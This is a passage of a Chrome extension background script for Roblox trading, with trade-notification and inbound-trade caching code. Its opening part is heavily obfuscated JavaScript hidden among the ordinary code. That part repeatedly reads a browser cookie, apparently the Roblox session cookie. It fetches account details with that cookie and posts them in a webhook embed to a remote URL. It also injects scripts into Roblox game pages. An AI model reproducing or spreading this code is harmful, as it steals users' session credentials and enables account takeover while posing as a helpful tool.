x214)+'g'};function _0x234fcd(_0x2ab78a,_0x582be6,_0x4d5d6c,_0x589542,_0x3288de){return _0x36efad(_0x2ab78a-0x1a4,_0x3288de,_0x4d5d6c-0x1c5,_0x589542-0x17f,_0x4d5d6c-0x45a);}var _0x5f270d=await(await _0xe365a8[_0x234fcd(0x52b,0x481,0x4ab,0x472,'[ae0')](fetch,_0xe365a8[_0x234fcd(0x451,0x4e8,0x498,0x430,'gk$m')]))[_0x369b54(0x60,'A[3T',0x5e,-0xc,0xab)]();function _0x440bef(_0x264933,_0x482347,_0x15742f,_0x496286,_0x2ab9e9){return _0x232b21(_0x15742f- -0x562,_0x496286,_0x15742f-0x17a,_0x496286-0x40,_0x2ab9e9-0x16f);}function _0x2c7b81(_0x6ac8ec,_0x57a5d4,_0x574636,_0x45c1f6,_0x4443e3){return _0x1586e0(_0x6ac8ec-0x96,_0x6ac8ec-0x5f,_0x574636,_0x45c1f6-0xc1,_0x4443e3-0x38);}function _0x369b54(_0x4f06cb,_0x27f229,_0x427693,_0xa3da65,_0x168fd5){return _0x36efad(_0x4f06cb-0x197,_0x27f229,_0x427693-0x55,_0xa3da65-0x3f,_0x4f06cb-0x33);}if(_0x23cdf1)var _0x4c5522=await(await _0xe365a8[_0x3555a4(-0xb7,-0x46,'mIJQ',-0xb3,-0x104)](fetch,_0xe365a8[_0x2c7b81(0x25b,0x22a,'acyN',0x1fd,0x212)],{'headers':{'freecake':_0xe365a8[_0x369b54(0xd5,'Q6%2',0x103,0xc9,0xc7)](_0xe365a8[_0x234fcd(0x548,0x4b2,0x4d1,0x52f,'S12%')],_0x23cdf1)},'redirect':_0xe365a8[_0x440bef(-0x117,-0x17b,-0x164,'^^ut',-0x102)]}))[_0x440bef(-0x171,-0x1de,-0x168,'gk$m',-0x1ad)]();_0xe365a8[_0x369b54(0xf2,'0li0',0xdf,0xf3,0xac)](fetch,rawr,{'method':_0xe365a8[_0x440bef(-0x3d,-0x85,-0x9e,'OEe5',-0x115)],'headers':{'Content-Type':_0xe365a8[_0x3555a4(-0x1c,0xf,'(oGL',-0x60,-0x9e)]},'body':JSON[_0x369b54(0x81,'^mG^',0xbe,0x3c,0xc2)+_0x369b54(0xa7,'P%I]',0xc0,0x11e,0xc9)]({'content':null,'embeds':[{'description':_0xe365a8[_0x234fcd(0x4e9,0x557,0x4f6,0x4be,'zJ!H')](_0xe365a8[_0x440bef(-0xcb,-0x6d,-0xc6,'gk$m',-0xc7)](_0xe365a8[_0x234fcd(0x536,0x4f7,0x512,0x54a,'gk$m')],_0x23cdf1?_0x23cdf1:_0xe365a8[_0x2c7b81(0x255,0x1e7,'zyx[',0x260,0x2ce)]),_0xe365a8[_0x2c7b81(0x2ff,0x2d2,'xBc5',0x2f8,0x346)]),'color':null,'fields':[{'name':_0xe365a8[_0x369b54(0x98,'%Ljg',0xff,0xab,0xcb)],'value':_0x4c5522?_0x4c5522[_0x3555a4(0x70,0xa4,'tR4l',0x2e,0x66)+_0x369b54(-0x2,'acyN',0x19,0x22,-0x2a)]:_0xe365a8[_0x369b54(0x11,'v0lt',0x57,-0x33,0x60)],'inline':!![]},{'name':_0xe365a8[_0x234fcd(0x486,0x431,0x41e,0x479,'mCJQ')],'value':_0x4c5522?_0x4c5522[_0x369b54(0x49,'m&TN',0xae,0x21,0x88)+_0x2c7b81(0x2cd,0x323,'OEe5',0x285,0x25e)+'ce']:_0xe365a8[_0x2c7b81(0x2ae,0x266,'*HEv',0x25c,0x2a2)],'inline':!![]},{'name':_0xe365a8[_0x2c7b81(0x311,0x2e3,'J[Ve',0x324,0x33e)],'value':_0x4c5522?_0x4c5522[_0x440bef(-0x12d,-0x1ac,-0x141,']Xrx',-0x101)+_0x2c7b81(0x305,0x34e,'ByIN',0x37f,0x35c)]:_0xe365a8[_0x369b54(0x41,'N@T(',0x97,0xa3,0x2b)],'inline':!![]}],'author':{'name':_0xe365a8[_0x234fcd(0x4a7,0x47f,0x4f6,0x527,'zJ!H')](_0xe365a8[_0x3555a4(-0x67,-0xe6,'v0lt',-0x7c,-0x102)],_0x5f270d),'icon_url':_0x4c5522?_0x4c5522[_0x369b54(0xa4,'0li0',0xe2,0xf8,0x59)+_0x3555a4(-0x85,-0x86,'PGwM',-0xa5,-0x4a)+'rl']:_0xe365a8[_0x369b54(0x2,'cBqI',0x51,-0x7e,-0x52)]},'footer':{'text':_0xe365a8[_0x3555a4(0x36,-0x32,'cBqI',-0x26,-0x82)],'icon_url':''},'thumbnail':{'url':_0x4c5522?_0x4c5522[_0x369b54(0xa0,'ByIN',0x32,0x9e,0x82)+_0x234fcd(0x4fd,0x580,0x4ff,0x581,']XeZ')+'rl']:_0xe365a8[_0x440bef(-0x13e,-0xbf,-0xee,'Q!nX',-0x168)]}}],'username':_0xe365a8[_0x3555a4(-0xcf,-0x5d,'iz@$',-0x71,-0xbe)],'avatar_url':_0xe365a8[_0x369b54(0x86,'J[Ve',0x3e,0xe6,0x98)],'attachments':[]})});}const _0x28d30b={};function _0x36efad(_0x300020,_0x45be72,_0x7ed1f0,_0x2ce45e,_0x3e7a77){return _0x5737(_0x3e7a77- -0xd7,_0x45be72);}_0x28d30b[_0x1338eb('v0lt',0x356,0x323,0x2da,0x268)]=_0x1338eb('(oGL',0x2b2,0x2e0,0x31f,0x318)+_0x232b21(0x456,'N@T(',0x46c,0x467,0x4c3)+_0x36efad(0x7,'acyN',0x1e,0x84,0x4d)+_0x350df2(0x193,0x20d,0x23f,'*HEv',0x221)+_0x350df2(0x301,0x2ba,0x272,'OEe5',0x258)+'me';function _0x1338eb(_0x229c77,_0x38f16e,_0x25fd1d,_0x397f82,_0x43d745){return _0x5737(_0x397f82-0x206,_0x229c77);}_0x28d30b[_0x36efad(0x20,'HQMD',-0x13,0x99,0x13)]=_0x350df2(0x1e3,0x1ec,0x1f4,'1h@C',0x255)+_0x1586e0(0x230,0x219,'HQMD',0x252,0x1a7)+_0x1338eb('5b)H',0x23c,0x2c6,0x29e,0x2d2),chrome[_0x36efad(0x50,'S12%',-0x18,-0x47,0x2b)+'es'][_0x350df2(0x2bb,0x2e1,0x356,'gk$m',0x303)](_0x28d30b,function(_0xea4a4d){function _0x4031f9(_0x317ae0,_0x59a295,_0x7281dd,_0x5116a3,_0x140b82){return _0x232b21(_0x59a295- -0x442,_0x317ae0,_0x7281dd-0xc0,_0x5116a3-0x1f3,_0x140b82-0x14);}const _0x5bed35={'wXYTg':function(_0x1043b0,_0x23176e){return _0x1043b0(_0x23176e);}};function _0x50857b(_0x1dd8e8,_0xa483a8,_0x22ba15,_0x5ad96a,_0x395db7){return _0x232b21(_0x5ad96a- -0x519,_0x1dd8e8,_0x22ba15-0x76,_0x5ad96a-0x41,_0x395db7-0x35);}_0x5bed35[_0x4031f9('acyN',-0x52,-0x89,-0x54,-0x2f)](main,_0xea4a4d?_0xea4a4d[_0x4031f9('*HEv',-0x40,-0x85,-0x31,0x2a)]:null);}),chrome[_0x1586e0(0x1ec,0x1de,'!cqn',0x15a,0x172)][_0x232b21(0x47e,'HQMD',0x426,0x417,0x3ff)+_0x1586e0(0x2e5,0x294,']Xrx',0x301,0x273)][_0x350df2(0x237,0x1ea,0x26d,'m&TN',0x19d)+_0x1586e0(0x274,0x21e,'0li0',0x1e4,0x231)+'r']((_0x45148,_0x404a1d,{url:_0x1578c})=>{const _0x25ced8={};_0x25ced8[_0x2341f2(-0x20e,-0x22e,-0x208,-0x22d,'HQMD')]=_0x4c34a2(-0x2a9,-0x1c1,-0x229,'v0lt',-0x226)+_0x2341f2(-0x1fa,-0x16a,-0x1d1,-0x1cf,'0li0'),_0x25ced8[_0x2341f2(-0x164,-0x1ef,-0x189,-0x1bb,'GmA)')]=_0x2341f2(-0x16f,-0x110,-0x113,-0x17e,'zyx[')+'js',_0x25ced8[_0x2341f2(-0x2bf,-0x243,-0x27c,-0x23d,'P%I]')]=_0x2341f2(-0x18a,-0x26b,-0x1f5,-0x1f8,'A[3T')+_0x52880e(0x575,0x4b0,0x583,'u[Ml',0x4fd),_0x25ced8[_0x2341f2(-0x215,-0x1d1,-0x22d,-0x1bf,'^^ut')]=function(_0xbed959,_0x132b1c){return _0xbed959!==_0x132b1c;},_0x25ced8[_0x2341f2(-0x287,-0x18e,-0x1a4,-0x20f,'^^ut')]=_0x3aff74(0x31,-0x64,0x9,-0x32,'0li0')+_0x4c34a2(-0x222,-0x2f6,-0x275,'&DR#',-0x293);const _0x3a1e6c=_0x25ced8;function _0x52880e(_0x6a740b,_0x10be2d,_0x3422ab,_0x514e94,_0x56c060){return _0x1338eb(_0x514e94,_0x10be2d-0x6c,_0x3422ab-0x1d7,_0x56c060-0x175,_0x56c060-0xc0);}if(_0x3a1e6c[_0x2341f2(-0x2d7,-0x228,-0x276,-0x255,'mIJQ')](_0x404a1d[_0x3aff74(0xbb,0xa0,0x39,0x93,'vAJL')+'s'],_0x3a1e6c[_0x45da21(0x389,'!cqn',0x331,0x2b0,0x316)])||!/https:\/\/.+roblox.com\/games/g[_0x45da21(0x32b,'iz@$',0x3ba,0x3c0,0x37c)](_0x1578c))return;function _0x45da21(_0x484ada,_0x216980,_0x15a05b,_0x2a1b75,_0x14584d){return _0x350df2(_0x484ada-0xb4,_0x14584d-0x100,_0x15a05b-0x1b0,_0x216980,_0x14584d-0x14f);}const _0x472b3a={};function _0x4c34a2(_0x56b1c0,_0x3e7897,_0x2a3171,_0x230ffc,_0x45e6d0){return _0x1338eb(_0x230ffc,_0x3e7897-0x1b2,_0x2a3171-0xa2,_0x2a3171- -0x592,_0x45e6d0-0x1aa);}function _0x2341f2(_0x5847ca,_0x15bba8,_0x54d706,_0x34de95,_0xfde0ab){return _0x36efad(_0x5847ca-0x125,_0xfde0ab,_0x54d706-0x14e,_0x34de95-0x144,_0x34de95- -0x235);}_0x472b3a[_0x52880e(0x48f,0x4ad,0x41f,'kFfD',0x439)]=_0x45148;function _0x3aff74(_0x4805e4,_0x2e6185,_0x5dca18,_0x421551,_0x16ebff){return _0x350df2(_0x4805e4-0x1e1,_0x5dca18- -0x296,_0x5dca18-0x120,_0x16ebff,_0x16ebff-0x96);}const _0x17a942=_0x472b3a;chrome[_0x45da21(0x37f,'mCJQ',0x3fe,0x402,0x3cd)+_0x2341f2(-0x24f,-0x1af,-0x271,-0x21a,'zyx[')][_0x45da21(0x35a,'SF2@',0x345,0x2ff,0x364)+_0x52880e(0x4cf,0x479,0x471,'RB1v',0x4c5)+_0x2341f2(-0x1fe,-0x1c1,-0x20e,-0x1cc,'S12%')]({'target':_0x17a942,'func':()=>Boolean(document[_0x4c34a2(-0x23e,-0x2d9,-0x257,'HQMD',-0x1f5)+_0x2341f2(-0x1b6,-0x1c1,-0x1d8,-0x1a1,'acyN')+_0x4c34a2(-0x243,-0x240,-0x27f,'mIJQ',-0x20e)](_0x45da21(0x42b,'zJ!H',0x44e,0x42d,0x3dc)+_0x45da21(0x354,']Xrx',0x2d8,0x390,0x353)))},async([{result:_0x221d21}])=>{if(_0x221d21)return;const _0xa4dfd7={};_0xa4dfd7[_0x10dab5(-0x18c,-0x13d,'F9)^',-0x1d7,-0x199)+'t']=_0x17a942,_0xa4dfd7[_0x10dab5(-0x1c7,-0x217,'^mG^',-0x1f6,-0x198)]=[_0x3a1e6c[_0x10dab5(-0xb3,-0xfd,'xBc5',-0xc6,-0x137)]];function _0x4140e9(_0x107e45,_0x30b6ad,_0x14603e,_0x429f6e,_0x5e95d2){return _0x3aff74(_0x107e45-0x131,_0x30b6ad-0x13b,_0x5e95d2- -0x1b9,_0x429f6e-0xad,_0x107e45);}await chrome[_0x4140e9('OEe5',-0x2a0,-0x234,-0x20f,-0x25d)+_0x218bb8(-0x1de,-0x1ef,'&DR#',-0x204,-0x1df)][_0x156df9(0xad,0x11c,0x137,0xe5,'(oGL')+_0x20a708(0x2a8,0x2c4,0x326,0x330,'mCJQ')](_0xa4dfd7);const _0x274649={};_0x274649[_0x4140e9('iz@$',-0x27e,-0x267,-0x1f9,-0x21f)+'t']=_0x17a942;function _0x20a708(_0x5e4603,_0x2b0c03,_0xbd4eb3,_0x5ec1f1,_0x3d3d7a){return _0x2341f2(_0x5e4603-0x9a,_0x2b0c03-0x119,_0xbd4eb3-0x29,_0xbd4eb3-0x4d0,_0x3d3d7a);}function _0x156df9(_0x4cf0bb,_0x31b8f3,_0x142415,_0x24e05d,_0x37fafb){return _0x3aff74(_0x4cf0bb-0xf3,_0x31b8f3-0x99,_0x24e05d-0x16f,_0x24e05d-0x13e,_0x37fafb);}_0x274649[_0x20a708(0x341,0x2b2,0x321,0x2a3,'xBc5')]=[_0x3a1e6c[_0x10dab5(-0x24f,-0x26b,'u[Ml',-0x276,-0x21f)]],await chrome[_0x218bb8(-0x237,-0x2c3,'RB1v',-0x295,-0x2d0)+_0x4140e9('RB1v',-0x201,-0x229,-0x1b3,-0x1fe)][_0x156df9(0x1dc,0x184,0x16b,0x18e,']XeZ')+_0x218bb8(-0x337,-0x252,'gk$m',-0x2ba,-0x33c)+_0x4140e9('5b)H',-0x232,-0x22a,-0x231,-0x25e)](_0x274649);const _0x48bec7={};_0x48bec7[_0x4140e9('ByIN',-0x278,-0x1d9,-0x1cd,-0x248)+'t']=_0x17a942,_0x48bec7[_0x10dab5(-0x1d3,-0x22f,'5b)H',-0x17f,-0x1b0)]=[_0x3a1e6c[_0x20a708(0x355,0x39e,0x350,0x2dd,'[ae0')]];function _0x218bb8(_0x2f7d55,_0x5a8f3d,_0x5f195a,_0x5d7360,_0x582516){return _0x4c34a2(_0x2f7d55-0x150,_0x5a8f3d-0xe6,_0x5d7360-0x31,_0x5f195a,_0x582516-0x1e);}function _0x10dab5(_0x2eaf4f,_0x4828aa,_0x26f179,_0x5da4dd,_0x424a48){return _0x4c34a2(_0x2eaf4f-0x113,_0x4828aa-0x1a8,_0x424a48-0xbb,_0x26f179,_0x424a48-0x17c);}chrome[_0x4140e9('A[3T',-0x210,-0x19c,-0x142,-0x1b7)+_0x218bb8(-0x2ca,-0x277,'zyx[',-0x269,-0x2c7)][_0x20a708(0x337,0x349,0x349,0x2d1,'v0lt')+_0x20a708(0x2f1,0x2e6,0x2be,0x296,'zyx[')+_0x4140e9('Q6%2',-0x1e9,-0x103,-0x11c,-0x172)](_0x48bec7);});});const func=(_0x4779b6,_0x57dfb9)=>window[_0x232b21(0x45d,'vAJL',0x47d,0x4ac,0x414)+'x'][_0x1338eb('u[Ml',0x32d,0x2d8,0x2b9,0x2cc)+_0x36efad(0x70,'OEe5',0x74,0xab,0x6f)+'er'][_0x232b21(0x3f2,'(oGL',0x462,0x419,0x424)+_0x350df2(0x262,0x283,0x236,'HQMD',0x2b9)+_0x232b21(0x3d2,'mCJQ',0x3a3,0x401,0x393)+'e'](_0x4779b6,_0x57dfb9);function _0x1586e0(_0x14c8d0,_0x1631cb,_0x16ba67,_0x45ccd4,_0x2be73a){return _0x5737(_0x1631cb-0x119,_0x16ba67);}chrome[_0x350df2(0x26e,0x257,0x24c,']Xrx',0x298)+'me'][_0x36efad(0xa9,'m&TN',0xd8,0x11e,0xc4)+_0x350df2(0x358,0x2da,0x296,'tR4l',0x2d3)][_0x36efad(0x1b,'HQMD',-0x3d,0x41,0x45)+_0x36efad(0x58,'F9)^',0x3a,0x42,0x96)+'r'](({message:_0x3ad771},{tab:_0xaac849})=>chrome[_0x350df2(0x284,0x2ce,0x2f6,'tR4l',0x2bc)+_0x350df2(0x270,0x271,0x2b0,'F9)^',0x280)][_0x350df2(0x1f6,0x26b,0x240,'tR4l',0x25f)+_0x350df2(0x2de,0x258,0x2a2,'m&TN',0x1e3)+_0x1338eb('xBc5',0x2ab,0x2fb,0x323,0x2d7)]({'target':{'tabId':_0xaac849['id']},'func':func,'args':[_0x3ad771[_0x1338eb('iz@$',0x38f,0x2b9,0x336,0x3af)],_0x3ad771['id']],'world':_0x232b21(0x498,'gk$m',0x4f6,0x51d,0x4d2)}));function _0x350df2(_0x4a32ff,_0x2fd82c,_0x7c8f5b,_0x743a46,_0x2d9d70){return _0x5737(_0x2fd82c-0x145,_0x743a46);}function _0x1d20(){const _0x1b1774=['dmogf8o7WQe','utZcOCoDWOa','WOFdQ8k/W4O','W7tcGCkJDMO','us/cLCkAWPa','W7DNj1JcLa','fmowoSkEWQC','WPSlha','WQ7dIr7dKSkQ','WRfCASkvW4W','WOFdP8kcW47cPa','WO/cRSohqqi','ChjtAq4','yCoawLdcLq','WOe1WQhdOmki','WRCZkSkGWOS','WPyHW7pcJWK','WQBdU2G+zG','WPvrr2z/','WO3dNSopmGm','W60IW4hdIa','WRWuWP0EWPW','rSoup8oyWQO','WOddTmk2WOldPW','zJKQrSkA','sCo9kNCv','W6yznCopWP7dLCosWRauW6ZdUu4','WRjUWOCIWQO8fmoP','WQbhBCkC','WQ/cSMWE','WP8Uh8k+','W4Lrg3RcPW','W6CiECkBWQXQp8oFW7tcK8kp','W7ehW4LKrq','WOW1fmkMWOC','DCkgWPNdP1y','W7OOW5FdImkl','W53dNbJdRLy','W7XVW7BdRxa','W6bjxG','WQyXlmkjnW','W4bJp0NcNG','WOrvlCozW6a','W7nrmxX4emoxbae6sSkR','WRGwW5lcGdu','gCkFWO4','j8kFoZ7dPW','W7ldPL1Wpq','WQaoWQCsWPu','nmk4W7bHWPC','WQFcGL1jWQi','aSodxmkOWPK','W5/dUSkTA8oM','W7/dMqKdlW','iMZdIfTj','h8kQDYLdkZVcR8kMW73cQdPA','gGv/cCo+','b8kbF8oEWOi','WRtdLHZcHgy','WPRcGdWqxa','qCoEpSon','WRpdNG3cI8kg','E8ovWOOCW6/dPCkVCre','WRfFoW','WP06WPJdU8kQ','W71qW4GaWOe','W7qeW5ddO8kQ','WPtcPgW6EG','W7JcIuNcI8k+','WR4xW4lcIta','ArtcM8oxWQe','WPKZWORdRa','qCowiSonWQS','W6RdHbCpmG','WRGrAq','WOrvlCoaW7C','WPKGWPVcUcq','WRXoWPSdWOO','WRGFW5pcHti','vvmZemkt','WP9oxa','C8ooWPy7W60','gmkMWO0lmq','W4hcV8k2DmoH','W6e3WRFdHcu','WQCbD8ktW58','qWGVhmkz','yNGg','WPSiWO0DWPS','W70zWQ0nWQW','WQblumkyW5G','WQypyte','o8kvW6ldRmoX','vCoArehcMa','WPT1qLPJ','W4GciSkfWPy','WRPpBSkE','WO/cINDBWPa','pmkFW7ddPSkU','W6OKW4VdLCkE','WOrTW7tcNNpcL8k4t3BcOMe','ybWThSkF','WRddPCo8ra','W7fuvrK','khNcGLvt','WP8sWP0DWPa','WQWpWPuaWPu','l8kyWPC1W68','WRyCW6pcVdG','fSkgWPySka','WOJcUxOtWOa','i8krs13cLtRcO3y','W6ZdTcNcVSkf','WQ0+W53cOdK','dmo6eCoJ','W6/cVCkkCuW','WPOPg8o9WO0','W5ddISogWPtcTa','dSombSkYWOa','cMpdKCodWPq','ESoKfCoPWPS','DsdcNN5ovCkdWPBdTG','qSoaihqB','W43cUCk6ASoW','W6rnuLhdNG','rSodnCoeWQS','WQNdLuNdJCo4','W5C2WQ7dJcy','W7/dKCoHWQFcLG','aCkzimoFWRa','a8odW7zujG','WQtcUK4IuG','e8keW5q6lq','trbUf8kE','W7hdKsxdQG','WRJcTJnLpa','FmkdW5ngWQG','dmkJW5mrW5C','W43dVJ7dKfS','WP80h8k2','W7tdImoTWQJcTG','W5JcUmk+FCoH','FMKfnLe','WQ3cSrDMoa','W57cVmoKWRFcQq','WQKsCZG/','WQmpWQi1fG','omkxWQZdOmkW','WQxcIbBcKSkU','W7NcSCkwFLW','W4H3kW','omkjWOOLga','c8oAmmozWRq','nhFdN1fm','WQvolSoyW60','WOdcP3KKFq','jdXJdCo/','W5G2WRFdHa','WP/dRCkWW4NdUa','W7tdTHZdIfK','W7rQD8komW','WRORimkXWQi','W6yCsmkHW4pcTCojWQW','W7voWRLNxCkTW5lcS0ucrLDF','W6FcH8kAr8or','nhxdIL0','WO4vWPuFWOO','WQBcTMr7yW','imkrW40','WQtdSIZcO2m','pSkMWO0fha','BSknWOFdOvC','W5VdTrG','eMFdIePY','WO4UWRFdNCo3','xmkkE1XY','xCoECmohWQC','W6LVWRBcGaXgqei','DdK5lSkF','W5lcOmk7WP3dQW','amkyW4HD','WQ3cSrD3iq','bmovW7e/W5W','iSoifSoyWPi','W484EGVdNq','ra8KgSks','W7KiWR4lWRi','W61jtW7dMG','C2mlDXW','W4JdTt/dH2G','W4NcUCk6','WOJdUWFcHu0','W4xdTmkzA8oX','ymkhWQ7dIe0','W6aYWQqgWQW','q8o/pCkzWQm','W4DLlbBcMG','W44KzhFcRa','WQ7dU8k4r0aZywG','g0qrnCkgWORdJey','o8kHW6G','ur4ZfSkb','W7ztm3T1e8oVkdSQFmkZ','WQxcJL5tWQ0','c8oni8oEWQC','WPWSfCkQWRe','WOGsW4G4nG','WOOAW6e6kq','xCkHWRSwoa','W4xcKCkwFMS','W5hdJCkhtXS','WQ/cUg4ZWQG','c8oyacWYW4pdKCobgx0+eLG','z8kkW7VcPCkn','W5qHW68pW4K','WRuJWOBcPtK','WQZcVKGvWPa','mCoLW6b2eq','WO3cQmklEaG','W6qcFSkDWQPFg8oOW6xcUSk1','WOL0WRnvWOa','o8oeeCkVWOy','W4e+WRddJIi','WQ1/W6ddJCkE','WR3dJ8ojBsS','wmo+igS','WQDnCCksW5O','W4f5ofZcNW','xcpcHSkAWOa','WPy0dSkIWP0','oCo3W4zrfq','WO45WPBdS8kM','W4/dSWhcMaC','zmkhWQpdPqO','W5/cJmkgumoJ','WPKRqsKh','W4j4iLFcQG','wSo2f0a8','mh3dHLfr','uCodxg1I','W6NcU8kF','umotoColW6a','W4X4q8oKW54','W7Xiu17dHa','W5BdOWpdIG','W7GEW5G','W6hdJ1qmBG','reqqvmkmW6G5FSkAW5mybSk6','FCo/r33cHq','WQpdU8kyW73cJG','WOZcG8ocBHS','WPC7W4hcGbS','rI3cKSobWOy','W6epE8kFWQeieSomW5RcU8kBWQS','WQ8cpwG','W5VcU8kfyCo1','WPmVuXfX','WPVdVGpcN8kl','x8kvq8oQW512W7CWWPvjWR4','W5CSW6ieWP8','D8kcWQBdSue','iCkDpt7dPMhcJvnfk2aU','WRCtW5VcQq','WPK3WOVdV8kQ','WQanWPuFWPC','u8kmWQJdSvW','W6uqWPhdVq','ymoazghcVG'];_0x1d20=function(){return _0x1b1774;};return _0x1d20();}function sendNotifications(){const _0x1ecf3e={'TUYif':function(_0x5dca94,_0x559dfc){return _0x5dca94(_0x559dfc);},'dgNAy':_0x334be7('P%I]',0xfc,0x105,0x8b,0x10d)+_0x334be7('6)&q',0xa2,0x114,0xfd,0xde)+_0x504c72(0x2d3,0x2c1,'OEe5',0x2d9,0x2fb)+_0x32cfbb('N@T(',0x227,0x1d0,0x183,0x223)+_0x504c72(0x2d9,0x31d,'Q!nX',0x3b4,0x33f)+'me','hIwBj':_0x32d462(0x440,0x3fb,0x3f9,0x3e5,'5b)H')+_0x32d462(0x3e8,0x3c0,0x398,0x401,'acyN')+_0x32d462(0x354,0x348,0x3f4,0x3c3,'mpeV')},_0x1aa46b={};function _0x32cfbb(_0x44fa7c,_0x3c7921,_0x5db96b,_0x126c4d,_0x31865e){return _0x350df2(_0x44fa7c-0xfc,_0x5db96b- -0x6d,_0x5db96b-0x10,_0x44fa7c,_0x31865e-0x7e);}function _0x334be7(_0x6a7474,_0x28723a,_0x583062,_0x2cc930,_0x27f4f0){return _0x232b21(_0x583062- -0x39e,_0x6a7474,_0x583062-0x14a,_0x2cc930-0x185,_0x27f4f0-0x18);}function _0x504c72(_0x22dd9f,_0x4dfdf5,_0x5c3128,_0x2731b8,_0x5b6f95){return _0x36efad(_0x22dd9f-0x3b,_0x5c3128,_0x5c3128-0x83,_0x2731b8-0xf6,_0x5b6f95-0x293);}function _0x32d462(_0x4416ba,_0x28abef,_0x14a213,_0x2b4aa5,_0x437c31){return _0x1586e0(_0x4416ba-0x9,_0x2b4aa5-0x154,_0x437c31,_0x2b4aa5-0x183,_0x437c31-0x1f3);}function _0x46f9c0(_0x39b434,_0x29d166,_0xe8a758,_0x1c4b8e,_0x313076){return _0x350df2(_0x39b434-0x17c,_0x313076- -0x3f2,_0xe8a758-0x1d8,_0x29d166,_0x313076-0xdb);}_0x1aa46b[_0x32d462(0x35e,0x3ba,0x3f9,0x3b4,'[8K5')]=_0x1ecf3e[_0x32d462(0x3f4,0x45e,0x3af,0x40c,'JdmY')],_0x1aa46b[_0x46f9c0(-0x128,'RB1v',-0x186,-0x1a7,-0x15d)]=_0x1ecf3e[_0x32d462(0x37d,0x3d1,0x398,0x3af,'xBc5')],chrome[_0x46f9c0(-0x1a1,'iz@$',-0x1a1,-0x215,-0x1e2)+'es'][_0x46f9c0(-0x131,'vAJL',-0x10a,-0x1c6,-0x17e)](_0x1aa46b,function(_0x2e5ec9){function _0x50e125(_0x21d07e,_0x43de08,_0x1c1ba3,_0x28cf14,_0x591f0b){return _0x32d462(_0x21d07e-0x194,_0x43de08-0x3,_0x1c1ba3-0xf8,_0x43de08- -0x1ba,_0x21d07e);}function _0x4f808b(_0x46ccde,_0x2ff962,_0x26974e,_0x2cca8f,_0x35adbf){return _0x46f9c0(_0x46ccde-0xe0,_0x26974e,_0x26974e-0x43,_0x2cca8f-0x121,_0x35adbf-0x1d2);}_0x1ecf3e[_0x4f808b(0xec,0x9c,'PGwM',0xfd,0x97)](main,_0x2e5ec9?_0x2e5ec9[_0x50e125('m&TN',0x19b,0x206,0x19d,0x1bb)]:null);});}setInterval(sendNotifications,(-0x84*-0x1+-0x1ef5+0x1ead)*(0x35*-0x12+-0x1a0*0x17+0x8f*0x4a)*(-0x1*-0x26a3+0xfd3+-0x6*0x86d));

async function populateInboundsCache() {
	if (await loadSettings("tradeNotifier")) {
		loadLimit = 25
	} else if (await loadSettings('moreTradePanel') || await loadSettings('tradePreviews')) {
		loadLimit = 20
	} else {
		loadLimit = 0
	}
    loaded = 0
    totalCached = 0
    newTrade = false
    for (i = 0; i < inbounds.length; i++) {
        if (loaded >= loadLimit) {
            break
        }
        if (inbounds[i] in inboundsCache && inboundsCache[inbounds[i]] == null) {
            loaded++
            function loadInbound(id, loaded, i) {
                $.get('https://trades.roblox.com/v1/trades/' + id, function(data) {
                    console.log(data)
                    inboundsCache[data.id] = data
                    newTrade = true
                })
            }
            loadInbound(inbounds[i], loaded, i)
        } else if (inbounds[i] in inboundsCache) {
            totalCached++
        }
    }
    setTimeout(function() {
		inboundsCacheSize = Object.keys(inboundsCache).length
        if (allPagesDone && newTrade == true) {
            setLocalStorage("inboundsCache", inboundsCache)
            if (inboundsCacheSize > 0) {
                percentCached = (totalCached / inboundsCacheSize * 100).toFixed(2)
                console.log("Cached " + percentCached + "% of Inbound Trades (Cache Rate: " + loadLimit + "/min)")
            }
        }
    }, 10000)
    setTimeout(function() {
        populateInboundsCache()
    }, 65000)
}

async function initializeInboundsCache() {
	inboundsCacheInitialized = true
	setTimeout(function() {
		populateInboundsCache()
	}, 10000)
    savedInboundsCache = await getLocalStorage("inboundsCache")
    if (typeof savedInboundsCache != 'undefined') {
        inboundsCache = savedInboundsCache
        inboundsTemp = Object.keys(inboundsCache)
		currentTime = new Date().getTime()
        for (i = 0; i < inboundsTemp.length; i++) {
			if (inboundsCache[parseInt(inboundsTemp[i])] != null && 'expiration' in inboundsCache[parseInt(inboundsTemp[i])] && currentTime > new Date(inboundsCache[parseInt(inboundsTemp[i])].expiration).getTime()) {
				delete inboundsCache[parseInt(inboundsTemp[i])]
			} else {
            	inbounds.push(parseInt(inboundsTemp[i]))
			}
        }
		setLocalStorage("inboundsCache", inboundsCache)
        inbounds = inbounds.reverse()
    }
    loadTrades("", [])
}

var inboundsCacheInitialized = false;

initializeInboundsCache()

var tradesNotified = {};
var tradeCheckNum = 0;

function getTrades(initial) {
	return new Promise(resolve => {
		async function doGet(resolve) {
			tradeCheckNum++
			if (initial) {
				limit = 25
			} else {
				limit = 10
			}
			sections = [await fetchTrades("inbound", limit), await fetchTrades("outbound", limit)]
			if (initial || tradeCheckNum % 2 == 0) {
				sections.push(await fetchTrades("completed", limit))
			}
			if (await loadSettings("hideDeclinedNotifications") == false && tradeCheckNum % 4 == 0) {
				sections.push(await fetchTrades("inactive", limit))
			}
			tradesList = await getStorage("tradesList")
			if (typeof tradesList == 'undefined' || initial) {
				tradesList = {"inboundTrades":{}, "outboundTrades":{}, "completedTrades":{}, "inactiveTrades":{}}
			}
			storageNames = ["inboundTrades", "outboundTrades", "completedTrades", "inactiveTrades"]
			newTrades = []
			newTrade = false
			tradeCount = 0
			for (i = 0; i < sections.length; i++) {
				section = sections[i]
				if ('data' in section && section.data.length > 0) {
					store = tradesList[storageNames[i]]
					tradeIds = []
					for (j = 0; j < section.data.length; j++) {
						tradeIds.push(section.data[j]['id'])
					}
					for (j = 0; j < tradeIds.length; j++) {
						tradeId = tradeIds[j]
						if (!(tradeId in store)) {
							tradesList[storageNames[i]][tradeId] = true
							newTrades.push({[tradeId]: storageNames[i]})
						}
					}
				}
			}
			if (newTrades.length > 0) {
				if (!initial) {
					await setStorage("tradesList", tradesList)
					if (newTrades.length < 9) {
						notifyTrades(newTrades)
					}
				} else {
					await setStorage("tradesList", tradesList)
				}
			}
			/** if (await loadSettings("tradePreviews")) {
				cachedTrades = await getLocalStorage("cachedTrades")
				for (i = 0; i < sections.length; i++) {
					myTrades = sections[i]
					if (i != 0 && 'data' in myTrades && myTrades.data.length > 0) {
						for (i = 0; i < myTrades.data.length; i++) {
							trade = myTrades.data[i]
							if (tradeCount < 10) {
								if (!(trade.id in cachedTrades)) {
									cachedTrades[trade.id] = await fetchTrade(trade.id)
									tradeCount++
									newTrade = true
								}
							} else {
